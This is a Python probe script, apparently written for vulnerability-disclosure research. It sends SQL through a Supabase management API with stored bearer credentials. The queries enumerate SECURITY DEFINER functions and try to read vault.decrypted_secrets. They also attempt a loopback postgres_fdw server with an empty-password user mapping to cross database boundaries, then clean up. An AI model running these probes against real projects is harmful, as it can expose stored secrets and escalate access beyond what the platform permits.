# -*- coding: utf-8 -*-
"""SECURITY DEFINER 修正扫描 + vault 面 + file_fdw/user mapping 边界 (可逆, 尾部清理)"""
import http.client, ssl, json, time, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _supabase_creds import BEARER_JWT, VDP_HEADERS, UA, API_HOST, PROJECT_REF

ctx = ssl.create_default_context()
out = []
def q(sql, tag):
    body = json.dumps({"query": sql})
    c = http.client.HTTPSConnection(API_HOST, timeout=25, context=ctx)
    h = {"User-Agent": UA, "Accept": "application/json", "Content-Type": "application/json",
         "Authorization": "Bearer " + BEARER_JWT}
    h.update(VDP_HEADERS)
    t0 = time.time()
    try:
        c.request('POST', '/v1/projects/%s/database/query' % PROJECT_REF, headers=h, body=body)
        r = c.getresponse()
        b = r.read(12000).decode('utf-8', errors='replace')
        out.append('### [%s] (%.1fs)\n%s | %s' % (tag, time.time() - t0, r.status, b[:7000]))
        c.close()
    except Exception as e:
        out.append('### [%s] ERR %s' % (tag, e))

# 1. SECURITY DEFINER 函数 (修正版)
q("select p.proname, n.nspname, p.proowner::regrole owner, p.prosecdef from pg_proc p join pg_namespace n on n.oid=p.pronamespace where p.prosecdef and n.nspname in ('auth','storage','extensions','vault','realtime','graphql','public','pgbouncer') order by n.nspname, p.proname;", "secdef")
# 2. vault 函数 owner
q("select p.proname, p.proowner::regrole owner, p.prosecdef from pg_proc p join pg_namespace n on n.oid=p.pronamespace where n.nspname='vault' order by p.proname;", "vault-funcs")
# 3. vault.decrypted_secrets 可读性
q("select count(*) n from vault.decrypted_secrets;", "vault-read")
# 4. file_fdw 可用
q("select name, default_version from pg_available_extensions where name like '%fdw%' or name like 'file%';", "fdw-avail")
# 5. user mapping 创建 (连自己 loopback; 空密码试)
q("create server sbx_fdw2 foreign data wrapper postgres_fdw options (host '127.0.0.1', port '5432', dbname 'postgres'); create user mapping for postgres server sbx_fdw2 options (user 'postgres', password '');", "umap")
# 6. 外部表读取尝试 (loopback 连 postgres 库读 pg_class)
q("create foreign table if not exists sbx_ft (x text) server sbx_fdw2 options (schema_name 'public', table_name 'pg_class'); select count(*) from sbx_ft;", "ft-read")
# 7. 清理
q("drop foreign table if exists sbx_ft; drop server if exists sbx_fdw2 cascade;", "cleanup")

open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_sb28_fdw.txt'), 'w', encoding='utf-8').write('\n'.join(out))
print('ttl=%ds' % (1788510807 - int(time.time())))
print('\n'.join(out)[:8000])
